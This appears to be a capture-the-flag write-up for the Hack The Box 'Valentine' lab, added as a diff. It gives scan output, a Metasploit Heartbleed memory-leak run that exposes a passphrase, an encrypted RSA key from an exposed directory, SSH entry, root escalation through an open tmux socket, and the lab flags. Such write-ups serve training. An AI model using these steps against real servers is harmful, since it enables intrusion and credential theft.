@@ -1,0 +1,355 @@
+                           _________________
+
+                            HTB - VALENTINE
+                           _________________
+
+
+Table of Contents
+_________________
+
+1. Enumeration
+.. 1. nmap
+..... 1. nmap -sC -sV valentine
+..... 2. nmap -p- valentine
+..... 3. nmap -p 443 --script ssl-heartbleed valentine
+.. 2. cyberchef
+.. 3. gobuster
+..... 1. gobuster dir -u <http://valentine> -w /usr/share/wordlists/dirbuster//directory-list-2.3-medium.txt -x php,txt,html
+.. 4. testssl.sh
+..... 1. ./testssl.sh <https://valentine>
+.. 5. metasploit
+..... 1. auxiliary/scanner/ssl/openssl_heartbleed
+2. Foothold
+3. Pivoting
+4. Privilege Escalation
+5. Flags
+
+
+1 Enumeration
+=============
+
+1.1 nmap
+~~~~~~~~
+
+1.1.1 nmap -sC -sV valentine
+----------------------------
+
+  [2024-09-22 Sun 12:55]
+  ,----
+  | Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-22 12:48 CEST
+  | Nmap scan report for valentine (10.10.10.79)
+  | Host is up (0.033s latency).
+  | Not shown: 997 closed tcp ports (conn-refused)
+  | PORT    STATE SERVICE  VERSION
+  | 22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
+  | | ssh-hostkey: 
+  | |   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
+  | |   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
+  | |_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
+  | 80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
+  | |_http-server-header: Apache/2.2.22 (Ubuntu)
+  | |_http-title: Site doesn't have a title (text/html).
+  | 443/tcp open  ssl/http Apache httpd 2.2.22
+  | | ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
+  | | Not valid before: 2018-02-06T00:45:25
+  | |_Not valid after:  2019-02-06T00:45:25
+  | |_ssl-date: 2024-09-22T10:48:28+00:00; 0s from scanner time.
+  | |_http-server-header: Apache/2.2.22 (Ubuntu)
+  | |_http-title: Site doesn't have a title (text/html).
+  | Service Info: Host: 10.10.10.136; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+  | 
+  | Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+  | Nmap done: 1 IP address (1 host up) scanned in 16.16 seconds   
+  `----
+
+
+1.1.2 nmap -p- valentine
+------------------------
+
+  [2024-09-22 Sun 12:55]
+
+  ,----
+  | Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-22 12:48 CEST
+  | Nmap scan report for valentine (10.10.10.79)
+  | Host is up (0.032s latency).
+  | Not shown: 65532 closed tcp ports (conn-refused)
+  | PORT    STATE SERVICE
+  | 22/tcp  open  ssh
+  | 80/tcp  open  http
+  | 443/tcp open  https
+  | 
+  | Nmap done: 1 IP address (1 host up) scanned in 10.01 seconds
+  `----
+
+
+1.1.3 nmap -p 443 --script ssl-heartbleed valentine
+---------------------------------------------------
+
+  ,----
+  | Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-22 13:16 CEST
+  | Nmap scan report for valentine (10.10.10.79)
+  | Host is up (0.032s latency).
+  | 
+  | PORT    STATE SERVICE
+  | 443/tcp open  https
+  | | ssl-heartbleed: 
+  | |   VULNERABLE:
+  | |   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
+  | |     State: VULNERABLE
+  | |     Risk factor: High
+  | |       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
+  | |           
+  | |     References:
+  | |       http://www.openssl.org/news/secadv_20140407.txt 
+  | |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
+  | |_      http://cvedetails.com/cve/2014-0160/
+  | 
+  | Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
+  `----
+
+
+1.2 cyberchef
+~~~~~~~~~~~~~
+
+  <https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&oeol=CRLF>
+
+  Decode `hype_key' from `hex' to `ascii'
+
+  ,----
+  | -----BEGIN RSA PRIVATE KEY-----
+  | Proc-Type: 4,ENCRYPTED
+  | DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46
+  | 
+  | DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
+  | 5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
+  | 0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
+  | Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
+  | OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
+  | pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
+  | QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
+  | p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
+  | Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
+  | t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
+  | XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
+  | aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+  | +wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
+  | AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
+  | r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
+  | 2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
+  | e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
+  | 09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
+  | dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
+  | cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
+  | pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
+  | Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
+  | suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
+  | l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
+  | RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
+  | -----END RSA PRIVATE KEY-----
+  `----
+
+
+1.3 gobuster
+~~~~~~~~~~~~
+
+1.3.1 gobuster dir -u <http://valentine> -w /usr/share/wordlists/dirbuster//directory-list-2.3-medium.txt -x php,txt,html
+-------------------------------------------------------------------------------------------------------------------------
+
+  ,----
+  | ===============================================================
+  | Gobuster v3.6
+  | by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+  | ===============================================================
+  | [+] Url:                     http://valentine
+  | [+] Method:                  GET
+  | [+] Threads:                 10
+  | [+] Wordlist:                /usr/share/wordlists/dirbuster//directory-list-2.3-
+  | [+] Negative Status codes:   404
+  | [+] User Agent:              gobuster/3.6
+  | [+] Extensions:              txt,html,php
+  | [+] Timeout:                 10s
+  | ===============================================================
+  | Starting gobuster in directory enumeration mode
+  | ===============================================================
+  | /index                (Status: 200) [Size: 38]
+  | /index.php            (Status: 200) [Size: 38]
+  | /.html                (Status: 403) [Size: 282]
+  | /dev                  (Status: 301) [Size: 304] [--> http://valentine/dev/]
+  | /encode.php           (Status: 200) [Size: 554]
+  | /encode               (Status: 200) [Size: 554]
+  | /decode.php           (Status: 200) [Size: 552]
+  | /decode               (Status: 200) [Size: 552]
+  | /omg                  (Status: 200) [Size: 153356]
+  | /.html                (Status: 403) [Size: 282]
+  | /server-status        (Status: 403) [Size: 290]
+  | Progress: 402049 / 882244 (45.57%)^C
+  | [!] Keyboard interrupt detected, terminating.
+  | Progress: 402177 / 882244 (45.59%)
+  | ===============================================================
+  | Finished
+  | ===============================================================
+  `----
+
+
+1.4 testssl.sh
+~~~~~~~~~~~~~~
+
+1.4.1 ./testssl.sh <https://valentine>
+--------------------------------------
+
+  ,----
+  | ###########################################################
+  |     testssl.sh       3.2rc3 from https://testssl.sh/dev/
+  | 
+  |       This program is free software. Distribution and
+  |              modification under GPLv2 permitted.
+  |       USAGE w/o ANY WARRANTY. USE IT AT YOUR OWN RISK!
+  | 
+  |        Please file bugs @ https://testssl.sh/bugs/
+  | 
+  | ###########################################################
+  | 
+  |  Using "OpenSSL 1.0.2-bad (1.0.2k-dev)" [~183 ciphers]
+  |  on ctf:./bin/openssl.Linux.x86_64
+  |  (built: "Sep  1 14:03:44 2022", platform: "linux-x86_64")
+  | 
+  | 
+  |  Start 2024-09-22 13:11:13                -->> 10.10.10.79:443 (valentine) <<--
+  | 
+  |  A record via:           /etc/hosts 
+  |  rDNS (10.10.10.79):     10.10.10.79.
+  |  Service detected:       HTTP
+  | 
+  | 
+  |  Testing protocols via sockets except NPN+ALPN 
+  | 
+  |  SSLv2      not offered (OK)
+  |  SSLv3      offered (NOT ok)
+  |  TLS 1      offered (deprecated)
+  |  TLS 1.1    offered (deprecated)
+  |  TLS 1.2    offered (OK)
+  |  TLS 1.3    not offered and downgraded to a weaker protocol
+  |  NPN/SPDY   not offered
+  |  ALPN/HTTP2 not offered
+  | ...
+  | 
+  |  Testing vulnerabilities 
+  | 
+  |  Heartbleed (CVE-2014-0160)                VULNERABLE (NOT ok)
+  |  CCS (CVE-2014-0224)                       VULNERABLE (NOT ok)
+  `----
+
+
+1.5 metasploit
+~~~~~~~~~~~~~~
+
+1.5.1 auxiliary/scanner/ssl/openssl_heartbleed
+----------------------------------------------
+
+  module configuration
+  ,----
+  | use auxiliary/scanner/ssl/openssl_heartbleed
+  | set RHOSTS 10.10.10.79
+  | set verbose true
+  | run
+  `----
+
+  ,----
+  | ......f.A..6h2.Q%.e..9..6.^..b..0.......f.....".!.9.8.........5.............................3.2.....E.D...../...A.......................................ux i686; rv:45.0) Gecko/20100101 Firefox/45.0..Referer: https://127.0.0.1/decode.php..Content-Type: application/x-www-form-urlencoded..Content-Length: 42....$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.I>......./o..f%...J..............^E.Y..........h.f'k...c... ...,.........Q......9....^.p...y.......q*............:...O.*....J..z.54qg.....j.F.C..................................................................................................................................... repeated 7527 times .....................................................................................................................................q.................................
+  `----
+
+  When we decode the base64 string
+
+  ,----
+  | aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
+  `----
+
+  we obtain
+
+  ,----
+  | heartbleedbelievethehype
+  `----
+
+
+2 Foothold
+==========
+
+  Obtained through ssh authentication with rsa key
+
+  ,----
+  | ssh -i hype_key_decoded hype@valentine
+  `----
+
+  The key was obtained by going to <http://valentine/dev/>, a
+  miss-configured directory which exposed all the file. The file
+  contained the key encoded in hexadecimal bytes.
+  - <http://valentine/dev/hype_key>
+
+  The passphrase was obtained by exploiting heartbleed with metasploit.
+
+  ,----
+  | heartbleedbelievethehype
+  `----
+
+  ----------------------------------------------------------------------
+
+  Core vulnerabilities:
+
+  - missconfiguration of directory
+  - exposed sensitive files (hype_key)
+  - vulnerable tls implementation (heartbleed)
+
+
+3 Pivoting
+==========
+
+  No pivoting is done.
+
+
+4 Privilege Escalation
+======================
+
+  To obtain root, check out the processes with `ps aux'
+
+  ,----
+  | root       1025  0.0  0.0  19976   976 tty2     Ss+  03:23   0:00 /sbin/getty -8 38400 tty2
+  | root       1027  0.0  0.1  26548  1676 ?        Ss   03:23   0:01 /usr/bin/tmux -S /.devs/dev_sess
+  | root       1028  0.0  0.0  19976   972 tty3     Ss+  03:23   0:00 /sbin/getty -8 38400 tty3
+  | root       1031  0.0  0.4  20652  4584 pts/17   Ss+  03:23   0:00 -bash
+  | 
+  `----
+
+  and simply execute the command
+  ,----
+  | /usr/bin/tmux -S /.devs/dev_sess
+  `----
+
+  this will grant you a tmux session with an open root shell.
+
+  ,----
+  | root@Valentine:~# whoami
+  | root
+  `----
+
+  ----------------------------------------------------------------------
+
+  Here two things to note:
+
+  - root session open without authentication mechanisms
+  - the tmux socket file allowed the hype user to use it
+
+
+5 Flags
+=======
+
+  user flag
+  - /home/hype/user.txt
+  ,----
+  | 1d7b1b33f86bfb8c23366cd9bcd57654
+  `----
+
+  root flag
+  - /root/root.txt
+    ,----
+    | 874ade28bb36a168f0b1c7bc11a22969
+    `----
